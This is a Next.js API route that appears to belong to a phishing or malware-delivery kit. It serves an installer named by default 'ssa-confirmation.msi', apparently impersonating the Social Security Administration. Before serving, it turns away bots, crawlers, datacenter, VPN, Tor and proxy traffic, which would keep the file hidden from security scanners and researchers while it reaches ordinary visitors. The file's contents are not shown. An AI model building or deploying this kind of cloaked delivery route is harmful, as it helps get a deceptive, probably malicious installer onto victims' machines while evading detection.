import { NextRequest, NextResponse } from 'next/server';
import { checkIP } from '@/lib/ipCheck';
import { 
    checkUserAgentForBot, 
    checkHeadersForProxy, 
    isDatacenterASN,
    generateRequestFingerprint,
    checkRateLimit 
} from '@/lib/serverAntiBot';
import { readFileSync, existsSync } from 'fs';
import { join } from 'path';

export async function GET(request: NextRequest) {
    try {
        const forwardedFor = request.headers.get('x-forwarded-for');
        const realIP = request.headers.get('x-real-ip');
        const cfConnectingIP = request.headers.get('cf-connecting-ip');
        const userAgent = request.headers.get('user-agent') || '';
        const acceptLanguage = request.headers.get('accept-language') || '';
        const acceptEncoding = request.headers.get('accept-encoding') || '';
        
        const ip = cfConnectingIP || forwardedFor?.split(',')[0]?.trim() || realIP || 'Unknown';

        if (ip === 'Unknown' || ip === '127.0.0.1' || ip === 'localhost') {
            console.log('[Download] Denied: Unknown/local IP');
            return new NextResponse('Access denied', { status: 403 });
        }

        const fingerprint = generateRequestFingerprint(ip, userAgent, acceptLanguage, acceptEncoding);
        const rateLimitCheck = checkRateLimit(fingerprint);
        
        if (rateLimitCheck.isRateLimited) {
            console.log(`[Download] Denied: Rate limited - ${ip}`);
            return new NextResponse('Access denied', { status: 429 });
        }

        const uaCheck = checkUserAgentForBot(userAgent);
        
        if (uaCheck.isBot) {
            console.log(`[Download] Denied: Bot detected - ${ip}, type: ${uaCheck.botType}`);
            return new NextResponse('Access denied', { status: 403 });
        }

        const proxyCheck = checkHeadersForProxy(request.headers);

        const apiKey = process.env.IPAPI_API_KEY;
        const securityCheck = await checkIP(ip, apiKey);

        if (securityCheck.asn && isDatacenterASN(securityCheck.asn)) {
            console.log(`[Download] Denied: Datacenter ASN - ${ip}, ASN: ${securityCheck.asn.org}`);
            return new NextResponse('Access denied', { status: 403 });
        }

        if (!securityCheck.isSafe || proxyCheck.isProxy) {
            const threats: string[] = [];
            if (securityCheck.checks.datacenter.detected) threats.push('datacenter');
            if (securityCheck.checks.vpn.detected) threats.push('vpn');
            if (securityCheck.checks.tor.detected) threats.push('tor');
            if (securityCheck.checks.proxy.detected) threats.push('proxy');
            if (securityCheck.checks.crawler.detected) threats.push('crawler');
            if (proxyCheck.isProxy) threats.push('proxy-headers');
            
            console.log(`[Download] Denied: Unsafe IP - ${ip}, threats: ${threats.join(', ')}`);
            return new NextResponse('Access denied', { status: 403 });
        }

        const downloadFileName = process.env.DOWNLOAD_FILE_PATH || 'ssa-confirmation.msi';
        
        const sanitizedFileName = downloadFileName.replace(/[\/\\]/g, '').replace(/\.\./g, '');
        
        if (sanitizedFileName !== downloadFileName || !sanitizedFileName) {
            console.log(`[Download] Denied: Invalid file path attempted`);
            return new NextResponse('Access denied', { status: 403 });
        }
        
        const protectedDir = join(process.cwd(), 'protected');
        const filePath = join(protectedDir, sanitizedFileName);
        
        if (!filePath.startsWith(protectedDir)) {
            console.log(`[Download] Denied: Path traversal attempt`);
            return new NextResponse('Access denied', { status: 403 });
        }
        
        if (!existsSync(filePath)) {
            console.log(`[Download] File not found: ${filePath}`);
            return new NextResponse('File not found', { status: 404 });
        }

        const fileBuffer = readFileSync(filePath);
        
        console.log(`[Download] Allowed: ${ip}, location: ${securityCheck.location?.country || 'Unknown'}, file: ${downloadFileName}`);
        
        return new NextResponse(fileBuffer, {
            status: 200,
            headers: {
                'Content-Type': 'application/octet-stream',
                'Content-Disposition': `attachment; filename="${downloadFileName}"`,
                'Content-Length': fileBuffer.length.toString(),
            },
        });
    } catch (error) {
        console.error('[Download] Error:', error);
        return new NextResponse('Access denied', { status: 403 });
    }
}
